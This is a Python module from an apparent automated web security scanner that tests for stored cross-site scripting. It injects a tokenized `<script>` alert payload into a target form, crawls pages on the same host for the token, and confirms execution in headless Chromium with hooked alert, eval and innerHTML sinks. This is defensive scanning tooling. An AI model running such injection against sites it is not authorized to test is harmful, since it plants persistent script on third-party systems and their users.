"""Stored XSS scanner — multi-step inject → crawl → verify.

Workflow:

  1. **Inject** — submit a uniquely-tokenized payload through the form
     under test. Persist the exact token.
  2. **Crawl** — scan a representative subset of host endpoints (already
     gathered by the crawler agent) plus a handful of "where stored
     content typically renders" candidates: `/`, `/profile`, `/dashboard`,
     `/posts`, `/comments`, `/feed`, the form's referring page, the next
     URL after a successful submit (Location-followed).
  3. **Verify execution** — for each page where the token appears,
     re-render in a Playwright browser with the JS sink hooks from
     `dom_xss.py`. If the browser fires `alert(token)` / `Function(...token...)`
     / `innerHTML` with the payload, that's a confirmed stored XSS.

Detection-only candidates (token reflects but doesn't fire) are still
reported at MEDIUM severity for human review.
"""
from __future__ import annotations

import asyncio
from typing import TYPE_CHECKING
from urllib.parse import urljoin, urlparse

from core.browser_pool import browser_slot
from core.utils import host_of, random_token

if TYPE_CHECKING:
    from core.orchestrator import Context

SEED_PATHS = ("/", "/home", "/profile", "/dashboard", "/posts", "/comments",
              "/feed", "/search", "/timeline", "/messages", "/notifications")


JS_HOOK = """
window.__sx_hits__ = [];
const tag = (k, v) => window.__sx_hits__.push({k, v: String(v).slice(0, 200)});
const _alert = window.alert;
window.alert = (m) => { tag('alert', m); try { return _alert(m); } catch(e) {} };
const _eval = window.eval;
window.eval = (s) => { tag('eval', s); try { return _eval(s); } catch(e) {} };
const ihDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
if (ihDesc && ihDesc.set) {
    Object.defineProperty(Element.prototype, 'innerHTML', {
        set(v) { tag('innerHTML', v); return ihDesc.set.call(this, v); },
        get() { return ihDesc.get.call(this); }, configurable: true,
    });
}
"""


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    if form is None or form.get("method", "GET").upper() == "GET":
        return findings
    inputs = [i for i in form.get("inputs", []) if i.get("type") not in ("file", "submit", "button", "reset")]
    if not inputs:
        return findings

    # 1) inject — fire one shot per text-shaped input
    token = random_token(8)
    payload = f"<script>window.__sx_stored__='SX_{token}_FIRED';alert('SX_{token}')</script>"
    text_inputs = [i for i in inputs if i.get("type") in (None, "text", "textarea", "")
                                       or i.get("type", "").lower() in ("email", "url", "tel")]
    if not text_inputs:
        text_inputs = inputs[:1]
    target_inp = text_inputs[0]
    data = {i["name"]: i.get("value") or random_token(4) for i in inputs if i.get("name")}
    data[target_inp["name"]] = payload

    submit_url = form["action"]
    submit_ev = await ctx.http.post(submit_url, data=data, allow_redirects=True)
    if submit_ev.error or submit_ev.status >= 500:
        return findings

    # 2) build search frontier — discovered crawl endpoints + seed paths +
    #    the page returned by the submit + the form's host root
    base = f"{urlparse(submit_url).scheme}://{urlparse(submit_url).netloc}"
    candidates: list[str] = [submit_ev.url]
    for path in SEED_PATHS:
        candidates.append(urljoin(base, path))
    # also hit the page that hosted the form, if known
    if form.get("discovered_at"):
        candidates.append(form["discovered_at"])
    # include a sample of crawled endpoints from memory
    for asset in ctx.memory.list_assets(ctx.target_slug, "endpoint")[:60]:
        candidates.append(asset["value"])
    seen, frontier = set(), []
    for u in candidates:
        if u in seen:
            continue
        if host_of(u) != host_of(submit_url):
            continue
        seen.add(u); frontier.append(u)

    # 3) reflection check — fast pass with httpx, only Playwright-verify
    #    pages where the token surfaces
    sem = asyncio.Semaphore(8)
    reflectors: list[str] = []

    async def check(u):
        async with sem:
            e = await ctx.http.get(u)
        if token in (e.response_body or ""):
            reflectors.append(u)

    await asyncio.gather(*(check(u) for u in frontier))
    if not reflectors:
        return findings

    # 4) Playwright execution check
    confirmed_url = None
    confirmed_sinks: list[str] = []
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        # No browser — still flag at MEDIUM as a stored-reflection candidate
        for u in reflectors:
            findings.append({
                "category": "xss",
                "title": f"Stored XSS candidate — token reflects on {u}",
                "severity": "medium", "cvss": 6.4,
                "url": u, "parameter": target_inp["name"], "payload": payload,
                "evidence": "Token submitted through the form re-appeared in another "
                            "page response. Manual confirmation of execution context "
                            "required (Playwright not installed).",
                "request": f"POST {submit_url}\n\n{data}",
                "response": "",
                "metadata": {"submitted_url": submit_url, "reflected_url": u,
                             "token": token},
            })
        return findings

    async with browser_slot(ctx.config), async_playwright() as pw:
        try:
            browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])
        except Exception:
            return findings
        context = await browser.new_context(
            ignore_https_errors=True,
            extra_http_headers=(ctx.session.headers if ctx.session else {}) or {},
        )
        if ctx.session and ctx.session.cookies:
            from urllib.parse import urlparse as _u
            cookies = []
            for u in reflectors:
                domain = _u(u).hostname
                if not domain:
                    continue
                for k, v in ctx.session.cookies.items():
                    cookies.append({"name": k, "value": v, "domain": domain, "path": "/"})
            if cookies:
                try:
                    await context.add_cookies(cookies)
                except Exception:
                    pass

        for u in reflectors[:8]:
            page = await context.new_page()
            await page.add_init_script(JS_HOOK)
            try:
                await page.goto(u, wait_until="networkidle", timeout=15000)
                await asyncio.sleep(1.0)
            except Exception:
                await page.close(); continue
            try:
                hits = await page.evaluate("window.__sx_hits__ || []")
            except Exception:
                hits = []
            await page.close()
            relevant = [h for h in hits if token in (h.get("v") or "")]
            if relevant:
                confirmed_url = u
                confirmed_sinks = sorted({h["k"] for h in relevant})
                break
        await browser.close()

    if confirmed_url:
        findings.append({
            "category": "xss",
            "title": f"Stored XSS — payload submitted to `{target_inp['name']}` "
                     f"executes on {confirmed_url}",
            "severity": "critical", "cvss": 8.8,
            "url": confirmed_url, "parameter": target_inp["name"], "payload": payload,
            "evidence": f"Multi-step PoC: payload submitted to {submit_url} via form "
                        f"input `{target_inp['name']}`. Browser visit to {confirmed_url} "
                        f"fired the payload at sinks: {confirmed_sinks}.",
            "request": f"POST {submit_url}\n\n{data}\n\nGET {confirmed_url}",
            "response": "",
            "metadata": {"submitted_url": submit_url,
                         "executed_at": confirmed_url,
                         "sinks": confirmed_sinks,
                         "token": token},
        })
    else:
        # token reflects but doesn't execute — still report
        for u in reflectors[:3]:
            findings.append({
                "category": "xss",
                "title": f"Stored XSS candidate — token reflects (no JS execution observed) on {u}",
                "severity": "medium", "cvss": 6.4,
                "url": u, "parameter": target_inp["name"], "payload": payload,
                "evidence": "Token persisted across requests and reflected on a different page, "
                            "but Playwright did not observe JS execution. Likely encoded — "
                            "review for context-specific breakout.",
                "request": f"POST {submit_url}\n\n{data}",
                "metadata": {"submitted_url": submit_url, "reflected_url": u, "token": token},
            })
    return findings
